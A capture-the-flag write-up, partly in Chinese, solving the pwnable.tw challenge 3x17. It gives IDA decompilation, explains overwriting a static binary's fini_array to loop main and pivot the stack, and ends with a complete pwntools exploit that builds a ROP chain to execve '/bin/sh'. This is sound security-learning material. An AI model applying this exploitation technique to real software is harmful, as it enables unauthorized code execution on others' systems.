# Challenges 100 Week 5


|   Challenges    |   Tricks    |
| :-------------: | :---------: |
| pwnable.tw-3x17 | `fini_arry` |

因为最近一直在读CSAPP刷题量变少了··

<!-- more -->

# 3x17

## ida

```c
void __fastcall __noreturn start(__int64 a1, __int64 a2, int a3)
{
  __int64 v3; // rax
  int v4; // esi
  __int64 v5; // [rsp-8h] [rbp-8h] BYREF
  void *retaddr; // [rsp+0h] [rbp+0h] BYREF

  v4 = v5;
  v5 = v3;
  sub_401EB0(
    (unsigned int)main,
    v4,
    (unsigned int)&retaddr,
    (unsigned int)sub_4028D0,
    (unsigned int)libc_fini,
    a3,
    (__int64)&v5);
  __halt();
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char *v4; // [rsp+8h] [rbp-28h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  result = (unsigned __int8)++byte_4B9330;
  if ( byte_4B9330 == 1 )
  {
    sub_446EC0(1u, "addr:", 5uLL);
    sub_446E20(0, buf, 0x18uLL);
    v4 = (char *)(int)sub_40EE70(buf);
    sub_446EC0(1u, "data:", 5uLL);
    sub_446E20(0, v4, 0x18uLL);
    result = 0;
  }
  if ( __readfsqword(0x28u) != v6 )
    sub_44A3E0();
  return result;
```

[Linux x86 Program Start Up](https://niebelungen-d.top/2020/10/13/Linux-x86-Program-Start-Up/)

是静态链接程序，查看`start`函数，发现其调用了三个函数，第一个就是`main`函数，而最后一个就是`libc_fini`函数。

在`main`中实现了任意地址写，但只能输入一次。我们打算采用系统调用的方式`get shell`，在静态链接程序中，`gadget`很充足。

为此，我们要布置好ROP链。为了能多次输入我们修改`fini_arry`数组使其不断的调用`main`，虽然进入输入有条件，但是因为是不断地调用，所以会发生溢出，达到条件让我们输入。

```assembly
.text:0000000000402960 libc_fini       proc near               ; DATA XREF: start+F↑o
.text:0000000000402960 ; __unwind {
.text:0000000000402960                 push    rbp
.text:0000000000402961                 lea     rax, unk_4B4100
.text:0000000000402968                 lea     rbp, off_4B40F0
.text:000000000040296F                 push    rbx
.text:0000000000402970                 sub     rax, rbp
.text:0000000000402973                 sub     rsp, 8
.text:0000000000402977                 sar     rax, 3
.text:000000000040297B                 jz      short loc_402996
.text:000000000040297D                 lea     rbx, [rax-1]
.text:0000000000402981                 nop     dword ptr [rax+00000000h]
.text:0000000000402988
.text:0000000000402988 loc_402988:                             ; CODE XREF: libc_fini+34↓j
.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]
```

这里`lea rbp, off_4B40F0`是将数组的地址当作rbp，而后面`call qword ptr [rbp+rbx*8+0]`就是相当于调用数组中的函数。所以我们通过这个将栈迁移到`0x4B4100`的位置。所以在这里进行ROP的构造。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher

leak = lambda name,addr: log.success('{:#x}'.format(name,addr))
context.log_level="DEBUG"
context.arch="amd64"

local=1
binary='./3x17'
#gdb.attach(p)
if local:
	p=process(binary)
else:
	p=remote('220.249.52.133',32446)

elf = ELF(binary,checksec=False)

def write(addr,data):    
	p.sendafter('addr:',str(addr))
	p.sendafter('data:',data)

libc_fini=0x0402960
fini_arry=0x04B40F0
main_addr=0x0401B6D

pop_rax=0x041e4af
pop_rdi=0x0401696
pop_rbx=0x0401e0b
pop_rdx=0x0446e35
pop_rsi=0x0406c30
syscall=0x04022b4
leave_ret=0x0401c4b
sh_addr=0x04B41aa
fake_stack=0x04B4100
gdb.attach(p)
write(fini_arry,p64(libc_fini)+p64(main_addr))
write(sh_addr,'/bin/sh\x00')
write(fake_stack,p64(pop_rax)+p64(0x3b))
write(fake_stack+0x10,p64(pop_rdi)+p64(sh_addr))
write(fake_stack+0x20,p64(pop_rsi)+p64(0))
write(fake_stack+0x30,p64(pop_rdx)+p64(0))
write(fake_stack+0x40,p64(syscall))
write(fini_arry,p64(leave_ret))

p.interactive()
```

